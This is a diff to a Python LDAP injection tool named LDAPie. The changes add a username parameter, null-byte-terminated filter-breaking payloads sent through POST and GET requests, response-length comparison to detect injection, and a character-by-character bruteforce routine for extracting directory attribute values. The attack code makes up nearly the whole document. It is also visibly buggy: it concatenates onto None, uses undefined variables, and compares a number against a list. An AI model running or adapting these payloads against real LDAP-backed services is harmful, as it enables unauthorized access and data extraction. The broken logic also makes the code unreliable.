@@ -8,7 +8,7 @@
 
 # importing the modules we'll need
 
-import requests, sys, time
+import requests, sys, time, string
 import argparse as ap
 
 #Let's make things look a little bit better and easier for people to use
@@ -23,7 +23,7 @@ print("""\033[1;36m
          TODO: loosen up request params, automate
                IF URL IS NOT SET YOU WILL GET FALSE NEGATIVES :)
 #####################################################
-USAGE: python LDAPie.py <opts> <get/post> <url> 
+USAGE: python LDAPie.py <opts> <user> <get/post> <url> 
 -h for help
 """)
 
@@ -36,37 +36,54 @@ class LDAPie:
         self.filename = filename
 
 #Function to take the file from sys args, read them, then we'll use that to build our request
-    def post(self,filename,url):
+    def post(self,filename,user,url):
 
         with open(wordlist, 'r') as f:
             a = f.read().splitlines()
             for x in a:
-                data = {'inputUsername':'ldapuser)('+x+'=*))(&'+x+'=void)'}
+                data = {'username':user+'*)(sn='+user+')('+x+'=*))%00'}
                 h = {'Connection':'Close'}
                 time.sleep(5)
                 r = requests.post(url,headers=h,data=data)
                 l = r.text
-                if len(l) not in [2810,2822]:
-                    print("\033[1;32mVALID LDAP INJECTION: "+str(data))
+                if len(l) not in [cl1,cl]:
+                    return("\033[1;32mVALID LDAP INJECTION: "+str(data))
             pass
 
-    def get(self):
+    def get(self,filename,user,url):
         with open(wordlist, 'r') as f:
             a = f.read().splitlines()
             for x in a:
-                url = sys.argv[5]+'/?inputUsername=ldapuser)('+x+'=*))(&'+x+'=void)'
+                url = sys.argv[7]+'='+user+'*)(sn='+user+')('+x+'=*))%00'
                 r = requests.get(url)
+                time.sleep(5)
                 l = r.text
-                print(url)
-                if len(l) not in [1,2]:
-                   print("\033[1;32mVALID LDAP INJECTION: "+url)
+                inj = []
+                print('\033[1;31m'+url)
+                if len(l) != [cl1]:
+                   inj.append(str(x))
+        return inj
+
+    def bruteforce(self,inj,url):
+        val = None
+        char = string.letters+string.digits+"""~!@#$%^&*()`-_=+[{]}\|;:'",<.>/?"""
+        url = sys.argv[7]
+        for i in range(1,100):
+            for x in char:
+                bf = requests.get(url+inj+val+x+"*))%00")
+        if user in r.content:
+            val += x
+            print("The Value For "+inj+" is "+val)
+#        break
+
 #main
 #SHOUT OUT TO RASTAMOUSE FOR THIS METHOD ON HOW TO HANDLE COMMANDLINE ARGS
 post = False
 get = False
 wordlist = None
 url = None
-
+user = None
+inj = None
 arg_index = 0
 for arg in sys.argv:
     if (arg == "-h"):
@@ -74,6 +91,7 @@ for arg in sys.argv:
 -w                      path/to/wordlist 
 -u                      path/to/vuln/service 
 -p                      post/-g get 
+-user			username
 -h                      help
 """)
         sys.exit(0)
@@ -85,14 +103,24 @@ for arg in sys.argv:
         post = True
     elif (arg == "-g"):
         get = True
+    elif (arg == "-user"):
+        user = sys.argv[arg_index + 1]
     arg_index = arg_index + 1
+
+d = {'username':'test*)(=*))(&=void)'}
+r = requests.post(url,data=d)
+l = r.text
+cl = len(l)
+rr = requests.get(url+'=asdfadsf')
+l1 = rr.text
+cl1 = len(l1)
 
 m = LDAPie(wordlist)
 if post == True:
-    p = m.post(wordlist,url)
+    p = m.post(wordlist,user,url)
     pass
 if get == True:
-    g = m.get(wordlist,url)
+    g = m.get(wordlist,user,url)
     pass
 
 elif get == False or post == False:
@@ -100,6 +128,7 @@ elif get == False or post == False:
 -w                      path/to/wordlist 
 -u                      path/to/vuln/service 
 -p                      post/-g get 
+-user			username
 -h                      help
 """)
 elif wordlist == None or url == None:
@@ -107,6 +136,10 @@ elif wordlist == None or url == None:
 -w                      path/to/wordlist 
 -u                      path/to/vuln/service 
 -p                      post/-g get 
+-user			username
 -h                      help
 """)
 
+if inj is not None:
+    m.bruteforce(inj,url)
+#    print("The Value For "+x+" is "+val)
